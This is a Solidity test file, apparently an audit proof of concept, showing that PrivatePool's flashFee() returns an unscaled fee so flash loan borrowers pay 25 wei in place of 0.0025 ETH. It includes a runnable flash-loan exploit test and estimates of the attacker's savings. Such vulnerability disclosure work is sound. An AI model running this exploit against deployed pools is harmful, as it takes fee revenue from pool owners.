// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../Fixture.sol";
import "../shared/FlashBorrower.sol";
import "../../src/PrivatePool.sol";

/**
 * @title ExploitTest - Flash Loan Fee Miscalculation Vulnerability PoC
 * @notice This test demonstrates that flashFee() returns an incorrectly scaled fee value.
 *
 * VULNERABILITY DESCRIPTION:
 * The PrivatePool contract uses the `changeFee` variable for both NFT change operations
 * and flash loans. For change operations, the fee is properly scaled using the formula:
 *   feePerNft = changeFee * 10^(decimals - 4)
 *
 * However, the flashFee() function simply returns the raw changeFee value without any
 * scaling, resulting in flash loan fees that are 10^14 times smaller than intended for
 * ETH (18 decimals) or 10^(decimals-4) times smaller for ERC20 tokens.
 *
 * IMPACT:
 * - Flash loan borrowers pay drastically reduced fees (e.g., 25 wei instead of 0.0025 ETH)
 * - Pool owners lose significant fee revenue from flash loans
 * - Economic incentive structure is broken
 *
 * ATTACK SCENARIO:
 * 1. Pool owner sets changeFee = 25 (expecting 0.0025 ETH per NFT for both change and flash)
 * 2. For change operations: fee = 25 * 10^14 = 0.0025 ETH ✓ (correct)
 * 3. For flash loans: fee = 25 wei ✗ (incorrect - should be 0.0025 ETH)
 * 4. Attacker exploits by taking flash loans at 10^14 times cheaper rate
 */
contract ExploitTest is Fixture {
    using stdStorage for StdStorage;

    FlashBorrower flashBorrower;
    PrivatePool privatePool;

    function setUp() public {
        // Create a private pool with ETH as base token
        // changeFee = 25 represents 0.0025 ETH (25 with 4 decimals precision)
        // This should mean:
        //   - Change fee: 0.0025 ETH per NFT
        //   - Flash loan fee: 0.0025 ETH per NFT (but actually returns 25 wei due to bug)
        privatePool = factory.create{value: 1e18}(
            address(0),           // baseToken = ETH (address(0))
            address(milady),      // nft
            100e18,               // virtualBaseTokenReserves
            10e18,                // virtualNftReserves
            25,                   // changeFee = 25 (should represent 0.0025 ETH)
            200,                  // feeRate = 2%
            bytes32(0),           // merkleRoot
            true,                 // useStolenNftOracle
            false,                // payRoyalties
            bytes32(address(this).balance), // salt
            new uint256[](0),     // tokenIds
            1e18                  // baseTokenAmount
        );

        // Mint an NFT to the pool for flash loan
        milady.mint(address(privatePool), 1);

        // Create flash borrower contract
        flashBorrower = new FlashBorrower(privatePool);
    }

    /**
     * @notice Demonstrates that flashFee returns the raw changeFee without proper scaling
     * @dev This test proves the vulnerability by comparing expected vs actual flash loan fees
     */
    function test_FlashLoanFeeIncorrectlyScaled() public {
        // EXPECTED BEHAVIOR:
        // changeFee = 25 with 4 decimals precision
        // For ETH (18 decimals): fee should be 25 * 10^(18-4) = 25 * 10^14 = 0.0025 ETH
        uint256 expectedFlashFee = 25 * 10 ** (18 - 4); // 0.0025 ETH = 2_500_000_000_000_000 wei

        // ACTUAL BEHAVIOR:
        // flashFee() just returns changeFee without scaling
        uint256 actualFlashFee = privatePool.flashFee(address(milady), 1);

        // VULNERABILITY PROOF:
        // The actual fee is 10^14 times smaller than expected
        assertEq(actualFlashFee, 25, "Flash fee should be raw changeFee value (25 wei)");
        assertEq(expectedFlashFee, 2_500_000_000_000_000, "Expected fee should be 0.0025 ETH");

        // Demonstrate the massive discrepancy
        assertEq(expectedFlashFee / actualFlashFee, 10 ** 14, "Fee is 10^14 times smaller than expected");

        // The borrower pays only 25 wei instead of 0.0025 ETH
        assertLt(actualFlashFee, expectedFlashFee, "Actual fee is drastically lower than expected");
    }

    /**
     * @notice Compares change fee calculation vs flash loan fee calculation
     * @dev Shows that changeFeeQuote properly scales the fee but flashFee does not
     */
    function test_ChangeFeeVsFlashFeeDiscrepancy() public {
        // For a single NFT (1e18 weight), calculate the change fee
        uint256 inputAmount = 1e18; // 1 NFT
        (uint256 changeFeeAmount,) = privatePool.changeFeeQuote(inputAmount);

        // Get the flash loan fee for the same NFT
        uint256 flashFeeAmount = privatePool.flashFee(address(milady), 1);

        // PROOF OF INCONSISTENCY:
        // Change fee is properly scaled: 25 * 10^14 = 0.0025 ETH
        assertEq(changeFeeAmount, 2_500_000_000_000_000, "Change fee should be 0.0025 ETH");

        // Flash fee is NOT scaled: just 25 wei
        assertEq(flashFeeAmount, 25, "Flash fee is only 25 wei");

        // The fees should be equal but they differ by 10^14
        assertEq(changeFeeAmount / flashFeeAmount, 10 ** 14, "Change fee is 10^14 times larger than flash fee");
    }

    /**
     * @notice Demonstrates the exploit: borrower pays negligible fee for flash loan
     * @dev Executes a flash loan and verifies the pool receives only 25 wei instead of 0.0025 ETH
     */
    function test_ExploitFlashLoanWithMinimalFee() public {
        // Get the (incorrectly low) flash fee
        uint256 flashFee = privatePool.flashFee(address(milady), 1);
        assertEq(flashFee, 25, "Flash fee is only 25 wei");

        // Fund the borrower with the minimal fee
        deal(address(flashBorrower), flashFee);

        // Record pool balance before flash loan
        uint256 poolBalanceBefore = address(privatePool).balance;

        // Execute flash loan - borrower pays only 25 wei
        flashBorrower.initiateFlashLoan(address(milady), 1, "");

        // Verify pool received only 25 wei instead of 0.0025 ETH
        uint256 poolBalanceAfter = address(privatePool).balance;
        uint256 feeReceived = poolBalanceAfter - poolBalanceBefore;

        assertEq(feeReceived, 25, "Pool received only 25 wei");
        assertEq(feeReceived, flashFee, "Pool received the incorrectly low fee");

        // The pool should have received 0.0025 ETH but got only 25 wei
        uint256 expectedFee = 2_500_000_000_000_000; // 0.0025 ETH
        uint256 lostRevenue = expectedFee - feeReceived;

        assertEq(lostRevenue, 2_499_999_999_999_975, "Pool owner lost almost all flash loan revenue");
        assertGt(lostRevenue, 0, "Pool owner suffered revenue loss");
    }

    /**
     * @notice Tests the vulnerability with an ERC20 base token
     * @dev Demonstrates the issue persists with different token decimals
     */
    function test_FlashLoanFeeIncorrectlyScaledWithERC20() public {
        // Create a new pool with ERC20 base token (shibaInu has 18 decimals)
        PrivatePool erc20Pool = factory.create(
            address(shibaInu),    // baseToken = ERC20
            address(milady),      // nft
            100e18,               // virtualBaseTokenReserves
            10e18,                // virtualNftReserves
            25,                   // changeFee = 25 (should represent 0.0025 tokens)
            200,                  // feeRate = 2%
            bytes32(0),           // merkleRoot
            true,                 // useStolenNftOracle
            false,                // payRoyalties
            bytes32(uint256(123)), // salt
            new uint256[](0),     // tokenIds
            0                     // baseTokenAmount
        );

        // Mint NFT to the pool
        milady.mint(address(erc20Pool), 2);

        // For ERC20 with 18 decimals, expected fee = 25 * 10^(18-4) = 0.0025 tokens
        uint256 expectedFee = 25 * 10 ** (18 - 4);
        uint256 actualFee = erc20Pool.flashFee(address(milady), 2);

        // Vulnerability: actual fee is just 25 (smallest unit) instead of 0.0025 tokens
        assertEq(actualFee, 25, "Flash fee is only 25 token units");
        assertEq(expectedFee, 2_500_000_000_000_000, "Expected fee is 0.0025 tokens");
        assertEq(expectedFee / actualFee, 10 ** 14, "Fee discrepancy is 10^14 for 18-decimal tokens");
    }

    /**
     * @notice Demonstrates economic impact: attacker can profit from cheap flash loans
     * @dev Shows how the vulnerability enables arbitrage or other attacks at minimal cost
     */
    function test_EconomicImpactOfVulnerability() public {
        // Scenario: Attacker wants to use flash loan for arbitrage
        // With correct fee: 0.0025 ETH per flash loan
        // With bug: only 25 wei per flash loan

        uint256 correctFee = 2_500_000_000_000_000; // 0.0025 ETH
        uint256 buggedFee = privatePool.flashFee(address(milady), 1);

        // If attacker performs 100 flash loans:
        uint256 flashLoanCount = 100;
        uint256 shouldPay = correctFee * flashLoanCount;  // 0.25 ETH
        uint256 actuallyPays = buggedFee * flashLoanCount; // 2500 wei

        uint256 attackerSavings = shouldPay - actuallyPays;

        // Attacker saves 0.25 ETH - 2500 wei ≈ 0.25 ETH
        assertEq(shouldPay, 250_000_000_000_000_000, "Should pay 0.25 ETH for 100 flash loans");
        assertEq(actuallyPays, 2500, "Actually pays only 2500 wei for 100 flash loans");
        assertGt(attackerSavings, 249_999_000_000_000_000, "Attacker saves ~0.25 ETH");

        // Pool owner loses significant revenue
        assertEq(attackerSavings, shouldPay - actuallyPays, "Pool owner's lost revenue equals attacker's savings");
    }
}
